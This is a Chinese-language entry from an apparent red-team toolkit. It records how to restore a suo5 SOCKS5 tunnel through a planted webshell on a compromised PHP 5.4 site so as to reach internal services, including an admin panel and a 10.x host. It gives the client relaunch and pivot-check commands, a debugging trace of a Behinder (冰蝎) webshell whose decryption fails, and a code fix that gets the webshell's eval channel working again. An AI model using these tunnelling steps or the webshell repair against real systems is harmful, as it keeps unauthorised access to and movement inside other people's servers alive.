# suo5 classic 隧道断链自愈 + PHP5.4 冰蝎马 openssl_decrypt("AES128") 返回 false 导致 200 空响应

- **code**: suo5-classic-隧道断链自愈-php5.4-冰蝎马-openssl_decrypt-aes128-返回-false-导致-200-空响应
- **kind**: script
- **category**: tunnel
- **component**: suo5 v2.2.0 / PHP 5.4 / 冰蝎 v4 载荷
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-13 在 203.0.113.68（tgt9215站群，PHP 5.4.45）实测：① 重启客户端后 1082/1080 两条 socks5 均穿透成功（http://127.0.0.1/→200 nginx、:888/→403 宝塔面板、:443/→302、10.0.27.215:80→403）；② 冰蝎通道修复后 POST /admin/example.com/beh 回显 BEH_OK_1791830704。
- **path**: pocs/suo5-classic-隧道断链自愈-php5.4-冰蝎马-openssl_decrypt-aes128-返回-false-导致-200-空响应/suo5_selfheal.sh
- **tags**: suo5,socks5,隧道,PHP5.4,冰蝎,openssl,运维
- **created_at**: 2026-10-12T18:48:34.932Z
- **found_by**: exploit

## 描述

suo5 classic 隧道断链的判定与自愈标准动作，附 PHP 5.4 上冰蝎马 openssl cipher 名导致"200 但空响应"的定位与修复。断链根因通常是客户端远端会话失效（TUNNEL_DIR 累积大量孤儿 .lock），而非载荷被清 —— 先比对 md5 再重启客户端。

## 用法

```
见正文。关键参数：--mode classic（auto 会选 half 导致测试连接被判 404 自杀）、-t 的 URL 单层 %2f、实测必须 --noproxy ""、上游代理用 --proxy http://UPSTREAM_PROXY。
```

## 正文

```
#!/bin/bash
# suo5 classic 隧道"自愈"标准动作：进程还在但穿不出去（curl: (97) cannot complete SOCKS5 connection）时用
# 1) 先判定：是真断还是假断（本机 no_proxy 会让 curl 绕过 socks5 直连本地 → 全 000 假象）
curl -s --noproxy "" --socks5-hostname 127.0.0.1:1082 -m 20 -o /dev/null -w "%{http_code}\n" "http://127.0.0.1/"
# 000 且 verbose 报 "cannot complete SOCKS5 connection to 127.0.0.1. (1)" ⇒ SOCKS5 reply=1，远端会话已死

# 2) 排除"载荷被主机防护清掉"：比对目标侧载荷 md5（走任何一条还活着的 PHP 通道）
#    /tmp/rc.inc、/www/wwwroot/<site>/2022/s5.inc 与本地备份 md5 一致 ⇒ 载荷没问题，是会话状态

# 3) 直接杀客户端重建（suo5 没有 reload，必须重启进程）
taskkill //F //IM suo5-windows-amd64.exe ; sleep 2
/c/Users/user/workspace/redteam/toolkit/suo5-windows-amd64.exe --mode classic --timeout 30 --retry 3 --debug \
  --proxy http://UPSTREAM_PROXY -t "https://TARGET/admin/example.com?g=1" -l 127.0.0.1:1082
# 日志出现 handshake succeeded, using session id: XXXX / test connection succeeded, tunnel is ready ⇒ 通

# 4) 实测穿透（必须 --noproxy ""）
curl -s --noproxy "" --socks5-hostname 127.0.0.1:1082 -m 25 -o /dev/null -w "%{http_code}\n" "http://127.0.0.1/"
curl -s --noproxy "" --socks5-hostname 127.0.0.1:1082 -m 25 -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:888/"

# ---- 附带：PHP 5.4 冰蝎马"200 但空响应"的坑 ----
# 冰蝎 v4 马常用 openssl_decrypt($post, "AES128", $key)；
# 在 PHP 5.4.45 + 该 OpenSSL 构建上 "AES128" 不是合法 cipher 名 → 返回 false
#   ⇒ $post=false ⇒ explode('|',false) ⇒ $arr[1] 为空 ⇒ eval('') ⇒ HTTP 200 且 body 0 字节
# 目标侧探针回显：openssl_ext=true / dec_AES128=false / dec_ecb='t|echo ...'
# 修法（一行回退，同时兼容新老 OpenSSL）：
#   $raw = $post;
#   $post = @openssl_decrypt($raw, "AES128", $key);
#   if ($post === false) { $post = @openssl_decrypt($raw, "aes-128-ecb", $key); }

```
